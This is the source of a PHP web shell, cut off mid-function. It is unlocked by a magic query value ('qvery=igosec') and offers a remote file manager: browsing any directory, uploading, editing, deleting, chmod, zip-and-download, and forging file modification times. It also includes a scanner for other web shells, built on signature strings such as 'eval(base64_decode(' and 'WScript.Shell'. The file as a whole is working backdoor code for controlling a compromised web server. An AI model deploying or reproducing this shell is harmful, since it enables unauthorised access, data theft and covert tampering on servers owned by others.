<?php
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
session_start();
set_time_limit(0);
function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}
//ip限制 过滤
function ip_test($ip,$iprule){  
   $ipruleregexp=str_replace('.*','ph',$iprule);  
   $ipruleregexp=preg_quote($ipruleregexp,'/');  
   $ipruleregexp=str_replace('ph','\.[0-9]{1,3}',$ipruleregexp);  
   if(preg_match('/^'.$ipruleregexp.'$/',$ip)) return true;  
   else return false;  
}
// 定义一个函数getIP() 
function getIP() { 
	global $ip; 
	if (getenv("HTTP_CLIENT_IP")) {
		$ip = getenv("HTTP_CLIENT_IP"); 
	}else if(getenv("HTTP_X_FORWARDED_FOR")) {
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	}else if(getenv("REMOTE_ADDR")) {
		$ip = getenv("REMOTE_ADDR"); 
	}else {
		$ip = "Unknow"; 
	}
	return $ip; 
}
//获取cdn加速后的ip地址
function get_real_ip()  {
	$ip=false;  
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))  {
		$ip = $_SERVER["HTTP_CLIENT_IP"];  
	}
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  {
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);  
		if ($ip)  {
			array_unshift($ips, $ip); $ip = FALSE;  
		}
		for ($i = 0; $i < count($ips); $i++)  {
			if (!eregi ("^(10|172/.16|192/.168)/.", $ips[$i]))  {
				$ip = $ips[$i];  
				break;  
			}
		}
	}
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);  
}
// 白名单，当IP至少满足一条规则时继续执行操作 
// $curr_ip=getIP(); 
$curr_ip=get_real_ip(); 
// echo $curr_ip;exit;
$white_list=array("10.168.168.137","10.168.168.138"); //白名单规则  
$test_success=false;  
foreach($white_list as $iprule){
   if(ip_test($curr_ip,$iprule)){
      $test_success=true;  
      break;  
   }  
}  

$salt = "silic1234";
$psw = trim($_POST['silicpass']);
$password="d2cc78b6d5723c39c034ebd0bef95f8e";
// echo md5($password);
$passt = $salt.$psw;
$passt = md5(md5(md5($passt)));
/*echo md5("532c9b3b146b0f211bdfa005a177f20f");
echo "<br>";
echo md5("9c3a9720372fdfac053882f578e65846"); //default
exit;*/
$mycode=trim($_GET['qvery']);
$_SESSION['qvery']=$mycode;
// if(!$test_success&&$_SESSION["qvery"]!="igosec"&&$mycode!="igosec"){
	// var_dump($_SESSION);
if($_SESSION["qvery"]!="igosec"&&$mycode!="igosec"){
	exit('非法操作');
}
$asse='asert';
function Root_CSS()
{
print<<<END
<style type="text/css">
*{padding:0; margin:0;}
body{background:threedface;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
a{color:#000000;text-decoration:none;}
a:hover{background:#BBBBBB;}
table{color:#000000;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;border:1px solid #999999;}
td{background:#F9F6F4;}
.toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}
.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
.footer{padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
</style>\n
END;
return false;
}
//文件管理
class packdir
{
	var $out='';
	var $datasec=array();
	var $ctrl_dir=array();
	var $eof_ctrl_dir="\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset=0;
function packdir($array)
{
	if(@function_exists('gzcompress'))
	{
		for($n = 0;$n < count($array);$n++)
		{
			$array[$n] = urldecode($array[$n]);
			$fp = @fopen($array[$n], 'r');
			$filecode = @fread($fp, @filesize($array[$n]));
			@fclose($fp);
			$this -> filezip($filecode,basename($array[$n]));
		}
	@closedir($zhizhen);
	$this->out = $this->packfile();
	return true;
}
return false;
}
function at($atunix = 0)
{
	$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
	if ($unixarr['year'] < 1980)
	{
		$unixarr['year']    = 1980;
		$unixarr['mon']     = 1;
		$unixarr['mday']    = 1;
		$unixarr['hours']   = 0;
		$unixarr['minutes'] = 0;
		$unixarr['seconds'] = 0;
	} 
	return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
}
function filezip($data, $name, $time = 0)
{
	$name = str_replace('\\', '/', $name);
	$dtime = dechex($this->at($time));
	$hexdtime	= '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
	eval('$hexdtime = "' . $hexdtime . '";');
	$fr	= "\x50\x4b\x03\x04";
	$fr	.= "\x14\x00";
	$fr	.= "\x00\x00";
	$fr	.= "\x08\x00";
	$fr	.= $hexdtime;
	$unc_len = strlen($data);
	$crc = crc32($data);
	$zdata = gzcompress($data);
	$c_len = strlen($zdata);
	$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
	$fr .= pack('V', $crc);
	$fr .= pack('V', $c_len);
	$fr .= pack('V', $unc_len);
	$fr .= pack('v', strlen($name));
	$fr .= pack('v', 0);
	$fr .= $name;
	$fr .= $zdata;
	$fr .= pack('V', $crc);
	$fr .= pack('V', $c_len);
	$fr .= pack('V', $unc_len);
	$this -> datasec[] = $fr;
	$new_offset = strlen(implode('', $this->datasec));
	$cdrec = "\x50\x4b\x01\x02";
	$cdrec .= "\x00\x00";
	$cdrec .= "\x14\x00";
	$cdrec .= "\x00\x00";
	$cdrec .= "\x08\x00";
	$cdrec .= $hexdtime;
	$cdrec .= pack('V', $crc);
	$cdrec .= pack('V', $c_len);
	$cdrec .= pack('V', $unc_len);
	$cdrec .= pack('v', strlen($name) );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('V', 32 );
	$cdrec .= pack('V', $this -> old_offset );
	$this -> old_offset = $new_offset;
	$cdrec .= $name;
	$this -> ctrl_dir[] = $cdrec;
}
function packfile()
{
	$data    = implode('', $this -> datasec);
	$ctrldir = implode('', $this -> ctrl_dir);
	return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
}
}
function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}
function File_Size($size)
{
	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
	else $size = $size . ' B';
	return $size;
}
function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}
function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}
function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
	@chmod($filename,0666);
	$key = @fwrite($handle,$filecode) ? true : false;
	}
@fclose($handle);
return $key;
}
function File_Up($filea,$fileb)
{
	$key = @copy($filea,$fileb) ? true : false;
	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
	return $key;
}
function File_Down($filename)
{
	if(!file_exists($filename)) return false;
	$filedown = basename($filename);
	$array = explode('.', $filedown);
	$arrayend = array_pop($array);
	header('Content-type: application/x-'.$arrayend);
	header('Content-Disposition: attachment; filename='.$filedown);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}
function File_Deltree($deldir)
{
	if(($mydir = @opendir($deldir)) == NULL) return false;	
	while(false !== ($file = @readdir($mydir)))
	{
		$name = File_Str($deldir.'/'.$file);
		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}
		if(is_file($name)){@chmod($name,0777);@unlink($name);}
	} 
	@closedir($mydir);
	@chmod($deldir,0777);
	return @rmdir($deldir) ? true : false;
}
function File_Act($array,$actall,$inver)
{
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e')
	{
		$zip = new packdir;
		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
		return '打包文件失败';
	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}
function File_Edit($filepath,$filename,$dim = '')
{
	$THIS_DIR = urlencode($filepath);
	$THIS_FILE = File_Str($filepath.'/'.$filename);
	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}&qvery=igosec">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;">
<input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}&qvery=igosec';" style="width:80px;"></div>
</form>
END;
}
function File_Soup($p)
{
	$THIS_DIR = urlencode($p);
	$UP_SIZE = get_cfg_var('upload_max_filesize');
	$MSG_BOX = '单个附件允许大小:'.$UP_SIZE.', 改名格式(new.php),如为空,则保持原文件名.';
	if(!empty($_POST['updir']))
	{
		if(count($_FILES['soup']) >= 1)
		{
			$i = 0;
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					$souptmp = $_FILES['soup']['tmp_name'][$key];
					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';
				}
				$i++;
			}
		}
		else
		{
			$MSG_BOX = '请选择文件';
		}
	}
print<<<END
<div class="msgbox">{$MSG_BOX}</div>
<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}&qvery=igosec" enctype="multipart/form-data">
<div class="actall">上传到目录: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">附件1 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
<div class="actall">附件2 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
<div class="actall">附件3 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
<div class="actall">附件4 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
<div class="actall">附件5 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
<div class="actall">附件6 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
<div class="actall">附件7 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
<div class="actall">附件8 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
<div class="actall"><input type="submit" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}
function File_a($p)
{
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$MSG_BOX = '等待消息队列';
	$UP_DIR = urlencode(File_Str($p.'/..'));
	$REAL_DIR = File_Str(realpath($p));
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
	$THIS_DIR = urlencode(File_Str($REAL_DIR));
	$NUM_D = 0;
	$NUM_F = 0;
	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}
	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}
	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}
	Root_CSS();
print<<<END
<script type="text/javascript">
	function Inputok(msg,gourl)
	{
		smsg = "当前文件:[" + msg + "]";
		re = prompt(smsg,unescape(msg));
		if(re)
		{
			var url = gourl + escape(re);
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == 'b')
			{
				document.getElementById('actall').value = escape(gourl);
				document.getElementById('fileall').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
</script>
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<div class="actall" style="text-align:center;padding:3px;">
<form method="GET"><input type="hidden" id="s" name="s" value="a">
<input type="hidden" id="qvery" name="qvery" value="igosec"> 
<input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
<select onchange="location.href='?s=a&qvery=igosec&p='+options[selectedIndex].value">
	<option>---特殊目录---</option>
	<option value="{$ROOT_DIR}">网站根目录</option>
	<option value="{$FILE_DIR}">本程序目录</option>
	/*<option value="C:/">C盘</option>
	<option value="D:/">D盘</option>
	<option value="E:/">E盘</option>
	<option value="F:/">F盘</option>
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动">启动项</option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">启动项(英)</option>
	<option value="C:/RECYCLER">回收站</option>
	<option value="C:/Program Files">Programs</option>
	<option value="/etc">etc</option>
	<option value="/home">home</option>
	<option value="/usr/local">Local</option>
	<option value="/tmp">Temp</option>*/
</select><input type="submit" value="转到" style="width:50px;"></form>
<div style="margin-top:3px;"></div>
<form method="POST" action="?s=a&p={$THIS_DIR}&qvery=igosec" enctype="multipart/form-data">
	<input type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&qvery=igosec&fn=');">
	<input type="button" value="新建目录" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&qvery=igosec&dn=');"> 
	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$REAL_DIR}&qvery=igosec';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="hidden" id="qvery" name="qvery" value="igosec"> 
	<input type="submit" value="上传" style="width:50px;">
</form></div>
<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}&qvery=igosec">
<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}&qvery=igosec"><b>上级目录</b></a></td>
<td class="toptd" style="width:80px;"> 操作 </td><td class="toptd" style="width:48px;"> 属性 </td><td class="toptd" style="width:173px;"> 修改时间 </td><td class="toptd" style="width:75px;"> 大小 </td></tr>
END;
	if(($h_d = @opendir($p)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(is_dir($Filepath))
		{
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filepath = urlencode($Filepath);
			echo "\r\n".' <tr><td> <a href="?s=a&qvery=igosec&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
			$Filename = urlencode($Filename);
			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> 删除 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td> ';
			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td> </td> </tr>'."\r\n";
			$NUM_D++;
		}
	}
	@rewinddir($h_d);
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(!is_dir($Filepath))
		{
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath);
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filesize = File_Size(@filesize($Filepath));
			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'?&qvery=igosec">'.$fname.'</a> </td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
			// echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'&qvery=igosec"> 编辑 </a> ';
			echo ' <td>  ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&qvery=igosec&rn=\');return false;"> 改名 </a> </td>';
			echo ' <td>'.$Fileperm.'</td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'&qvery=igosec">'.$Filesize.'</a> </td></tr> '."\r\n";
			$NUM_F++;
		}
	}
	@closedir($h_d);
	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input type="hidden" id="qvery" name="qvery" value="igosec"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$THIS_DIR}','a');return false;"> 
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','silic.gz','e');return false;"> 
目录({$NUM_D}) / 文件({$NUM_F})</div> </form> 
END;
return true;
}
//扫描木马
function Antivirus_Auto($sp,$features,$st,$sb)
{
	if(($h_d = @opendir($sp)) == NULL) return false;
	$ROOT_DIR = File_Mode();
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($sp.'/'.$Filename);
		if(is_dir($Filepath) && $sb) Antivirus_Auto($Filepath,$features,$st);
		if(eregi($st,$Filename))
		{
			if($Filepath == File_Str(__FILE__)) continue;
			$ic = File_Read($Filepath);
			foreach($features as $var => $key)
			{
				if(stristr($ic,$key))
				{
					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
					// echo ' <a href="'.$Fileurls.'?&qvery=igosec" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> 【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'&qvery=igosec" target="_blank"> 编辑 </a> <a href="?s=e&df='.urlencode($Filepath).'&qvery=igosec" target="_blank"> 删除 </a> 】 ';
					echo ' <a href="'.$Fileurls.'?&qvery=igosec" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br>  <a href="?s=e&df='.urlencode($Filepath).'&qvery=igosec" target="_blank"> 删除 </a> 】 ';
					echo ' 【 '.$Filetime.' 】 <font color="#FF0000"> '.$var.' </font> <br> <br> '."\r\n";
					break;
				}
			}
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Antivirus_e()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sp']) ? $_POST['sp'] : File_Mode();
	$features_php = array('eval一句话特征'=>'@eval($','大马read特征'=>'->read()','大马readdir特征3'=>'readdir(','MYSQL自定义函数语句'=>'returns string soname','加密特征1'=>'eval(gzinflate(','加密特征2'=>'eval(base64_decode(','加密特征3'=>'base64_decode(','eval一句话2'=>'@eval($','php复制特征'=>'copy($_FILES','复制特征2'=>'copy ($_FILES','上传特征'=>'move_uploaded_file($_FILES','上传特征2'=>'move_uploaded_file ($_FILES','小马特征'=>'str_replace(\'\\\\\',\'/\',');
	$features_asx = array('脚本加密'=>'VBScript.Encode','加密特征'=>'#@~^','fso组件'=>'fso.createtextfile(path,true)','excute一句话'=>'execute','eval一句话'=>'eval','wscript特征'=>'F935DC22-1CF0-11D0-ADB9-00C04FD58A0B','数据库操作特征'=>'13709620-C279-11CE-A49E-444553540000','wscript特征'=>'WScript.Shell','fso特征'=>'0D43FE01-F093-11CF-8940-00A0C9054228','十三函数'=>'╋╁','aspx大马特征'=>'Process.GetProcesses','aspx一句话'=>'Request.BinaryRead');
print<<<END
<form method="POST" name="tform" id="tform" action="?s=e&qvery=igosec">
<div class="actall">扫描路径 <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">木马类型 <input type="checkbox" name="stphp" value="php" checked>php木马 
<input type="checkbox" name="stasx" value="asx">asp+aspx木马</div>
<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>将扫马应用于该文件夹,子文件夹和文件
<br><input type="radio" name="sb" value="b">仅将扫马应用于该文件夹</div>
<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
if(!empty($_POST['sp']))
{
	echo '<div class="actall">';
	if(isset($_POST['stphp'])){$features_all = $features_php; $st = '\.php|\.inc|\;';}
	if(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
	if(isset($_POST['stphp']) && isset($_POST['stasx'])){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
	$sb = ($_POST['sb'] == 'a') ? true : false;
	echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? '扫描完毕' :  '异常终止';
	echo '</div>';
}
return true;
}
//搜索文件
function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
{
	//echo $sfp.'<br>'.$sfc.'<br>'.$sft.'<br>'.$sff.'<br>'.$sfb;
	if(($h_d = @opendir($sfp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		if(eregi($sft,$Filename)) continue;
		$Filepath = File_Str($sfp.'/'.$Filename);
		if(is_dir($Filepath) && $sfb) Findfile_Auto($Filepath,$sfc,$sft,$sff,$sfb);
		if($sff)
		{
			if(stristr($Filename,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'&qvery=igosec"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
		else
		{
			$File_code = File_Read($Filepath);
			if(stristr($File_code,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'&qvery=igosec"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
	}
	@closedir($h_d);
	return true;
}
function Findfile_j()
{
